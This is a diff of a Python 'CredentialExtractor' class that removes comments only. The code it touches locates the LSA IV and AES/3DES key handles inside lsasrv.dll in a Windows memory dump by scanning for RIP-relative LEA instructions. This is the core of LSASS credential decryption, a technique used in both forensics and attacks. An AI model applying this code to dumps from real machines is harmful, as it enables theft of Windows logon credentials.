@@ -102,7 +102,6 @@ class CredentialExtractor:
         for pattern_info in patterns:
             results = self.dump.search_memory(pattern_info["pattern"])
             for addr in results:
-                # Verify it's within lsasrv.dll
                 if not (lsasrv.base_address <= addr < lsasrv.base_address + lsasrv.size):
                     continue
 
@@ -145,14 +144,11 @@ class CredentialExtractor:
         global data (RIP-relative). The globals form a group:
         IV (16 bytes) + hAesKey (8 bytes ptr) + h3DesKey (8 bytes ptr).
         """
-        # Read a window around the pattern match
         window_start = addr
         window = self.dump.read_memory(window_start, 64)
         if not window:
             return None
 
-        # Find LEA instructions with RIP-relative addressing in the window
-        # Opcodes: 48 8D 15 (lea rdx), 48 8D 0D (lea rcx), 4C 8D 05 (lea r8)
         lea_targets = []
         for i in range(len(window) - 7):
             if window[i] in (0x48, 0x4C) and window[i + 1] == 0x8D:
@@ -166,8 +162,6 @@ class CredentialExtractor:
         if not lea_targets:
             return None
 
-        # Among LEA targets, find one that looks like a key handle pointer
-        # (points to heap memory containing RUUU/KSSM structures)
         for target in lea_targets:
             keys = self._try_key_globals_at(target)
             if keys:
@@ -188,12 +182,10 @@ class CredentialExtractor:
             haes_addr = h3des_addr - 8
             iv_addr = h3des_addr - 24
 
-            # Read IV candidate (16 bytes)
             iv_data = self.dump.read_memory(iv_addr, 16)
             if not iv_data or iv_data == b"\x00" * 16:
                 continue
 
-            # Read handle pointers
             aes_ptr_data = self.dump.read_memory(haes_addr, 8)
             des_ptr_data = self.dump.read_memory(h3des_addr, 8)
             if not aes_ptr_data or not des_ptr_data:
@@ -202,13 +194,11 @@ class CredentialExtractor:
             aes_handle = struct.unpack_from("<Q", aes_ptr_data)[0]
             des_handle = struct.unpack_from("<Q", des_ptr_data)[0]
 
-            # Validate: handles should be heap pointers (non-zero, reasonable range)
             if not (0x1000 < aes_handle < 0x800000000000):
                 continue
             if not (0x1000 < des_handle < 0x800000000000):
                 continue
 
-            # Try to read keys from the handles
             aes_key = self._read_bcrypt_key(aes_handle)
             des_key = self._read_bcrypt_key(des_handle)
 
